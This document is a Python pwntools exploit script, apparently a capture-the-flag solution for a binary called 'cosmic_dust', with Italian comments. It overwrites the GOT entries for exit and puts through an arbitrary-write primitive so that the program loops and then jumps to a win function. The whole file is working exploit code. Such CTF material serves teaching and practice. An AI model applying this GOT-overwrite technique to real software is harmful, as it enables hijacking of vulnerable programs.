```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./cosmic_dust")
libc = exe.libc

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    FLAG = b'0x404058'
    WIN = b'0x00000000004011d6'
    
    #Creo un loop nel programma
    r.recv(4096)
    r.sendline(hex(exe.got.exit).encode() + b" " + hex(exe.sym._start).encode())

    for i in range(0,8):
        r.recv(4096)
        # Calcolo l'indirizzo specifico da sovrascrivere
        address_to_overwrite = exe.got.puts + i
        # Ottieni il byte da win da scrivere all'indirizzo target
        to_write = WIN[:len(WIN) - 2 * i]

        print(hex(address_to_overwrite).encode(), to_write)
        
        r.sendline(hex(address_to_overwrite).encode() + b" " + to_write)
    
    #Chiama win permettendo a puts(win) di essere chiamata
    r.recv(4096)
    r.sendline(FLAG + b" " + b'0x1')
    r.interactive()


if __name__ == "__main__":
    main()
```
